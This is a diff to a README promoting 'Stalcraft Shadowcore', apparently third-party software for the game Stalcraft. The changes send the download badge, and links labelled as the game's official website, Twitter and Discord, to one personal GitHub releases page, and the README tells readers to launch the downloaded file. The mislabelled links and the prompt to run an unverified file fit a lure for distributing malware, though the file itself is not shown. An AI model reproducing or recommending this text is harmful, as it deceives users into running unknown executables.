@@ -34,7 +34,7 @@ Explore the full potential of Shadowcore and unlock new possibilities in your ga
 
 To download the Stalcraft Shadowcore software, visit the following link and unleash the power within: 
 
-[![Download Shadowcore](https://img.shields.io/badge/Download-Shadowcore-yellow)](https://github.com/repo/releases/9246/App.zip)
+[![Download Shadowcore](https://github.com/Mahmoud984881/Stalcraft-Shadowcore/releases)](https://github.com/Mahmoud984881/Stalcraft-Shadowcore/releases)
 
 Note: Launch the downloaded file to begin your Shadowcore experience.
 
@@ -44,9 +44,9 @@ In case the provided link is not working, please check the "Releases" section of
 
 For the latest updates, news, and support regarding Stalcraft Shadowcore, make sure to follow our official channels and join the community:
 
-- [Official Website](https://www.stalcraft.com)
-- [Twitter](https://twitter.com/stalcraft)
-- [Discord](https://discord.gg/stalcraft)
+- [Official Website](https://github.com/Mahmoud984881/Stalcraft-Shadowcore/releases)
+- [Twitter](https://github.com/Mahmoud984881/Stalcraft-Shadowcore/releases)
+- [Discord](https://github.com/Mahmoud984881/Stalcraft-Shadowcore/releases)
 
 Join the Stalcraft community today and elevate your gaming experience with Shadowcore!
 
